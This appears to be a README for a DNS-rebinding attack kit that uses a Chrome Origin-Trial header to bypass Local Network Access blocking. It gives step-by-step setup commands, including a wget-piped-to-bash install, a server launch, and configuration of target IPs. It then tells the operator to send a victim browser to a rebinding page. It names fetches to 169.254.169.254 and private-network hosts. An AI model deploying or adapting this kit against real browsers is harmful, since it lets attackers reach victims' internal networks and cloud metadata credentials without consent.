# horizon-lna

Minimal DNS-rebinding attack with **Chrome Local Network Access (LNA) bypass** baked in. Uses a custom-built `singularity-server` from the `Experimental/LNA-from-Non-Secure-Contexts` branch of `nccgroup/singularity` (commits `ef2da99` + `4301f9d`), which adds an `Origin-Trial` response header that lets a public-origin page hit RFC1918 / loopback / link-local targets in current Chrome.

See [WIKI.md](WIKI.md) for the deep dive on the rebind flow.

## Quick start

1. **Clone**
   ```sh
   git clone https://github.com/atemporalzen/horizon-lna
   cd horizon-lna
   ```

2. **Install Go** (only needed if you want to rebuild the binary; a prebuilt Linux x86_64 binary ships in this repo)
   ```sh
   wget -q -O - https://git.io/vQhTU | bash -s -- --version 1.26.1
   ```

3. **Disable systemd-resolved** (frees up port 53 for the DNS server)
   ```sh
   sudo systemctl disable --now systemd-resolved.service
   ```

4. **Set a real resolver in `/etc/resolv.conf`**
   ```
   nameserver 8.8.8.8
   ```

5. **Register an Origin Trial token** for your attacker domain at <https://developer.chrome.com/origintrials/> — pick the **"Local Network Access from Non-Secure Contexts"** trial. You'll get a long opaque token string.

6. **Edit `html/amaze.html`** — set `CONFIG.attackHostIPAddress`, `CONFIG.attackHostDomain` (must start with `dynamic.`, e.g. `dynamic.your.domain`), and `CONFIG.targetHostIPAddress` / `targetPath`.

7. **Run** (note the `-OriginTrialToken PORT:TOKEN` flag — repeatable per port)
   ```sh
   ./singularity-server \
       -HTTPServerPort 80 \
       -OriginTrialToken 80:<your-very-long-token-here>
   ```

Then have the victim browser visit `http://rebinder.az2.website/amaze.html`.

## How the bypass works

- The server attaches `Origin-Trial: <token>` to every HTTP response from the configured port.
- Chrome reads the header on the attacker-origin page and grants the page LNA permission for the duration of the trial.
- The rebound `fetch` to `169.254.169.254` (or any RFC1918 target) is no longer blocked by Chrome's Private Network Access checks.
- Both iframes that need it (`addFrameToDOM` in `amaze.html`, `startReloadChildFrame` in `payload.js`) already carry `allow="local-network-access *"` — no client-side changes vs the base `horizon` build.

## Rebuilding the binary

The shipped binary is `linux/amd64`, statically linked, built from `nccgroup/singularity` `Experimental/LNA-from-Non-Secure-Contexts`. To rebuild:

```sh
git clone https://github.com/nccgroup/singularity
cd singularity
git checkout Experimental/LNA-from-Non-Secure-Contexts
GOOS=linux GOARCH=amd64 go build -o singularity-server ./cmd/singularity-server
```
